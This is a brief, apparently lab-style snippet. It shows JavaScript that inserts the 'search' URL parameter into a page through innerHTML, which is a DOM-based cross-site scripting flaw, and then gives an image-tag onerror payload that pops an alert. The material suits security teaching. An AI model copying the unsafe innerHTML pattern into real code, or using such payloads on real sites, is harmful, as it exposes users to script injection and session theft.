<script>
    function doSearchQuery(query) {
	document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
	doSearchQuery(query);
    }
</script>

Exploit: Search  <img src=x onerror="alert(1)">
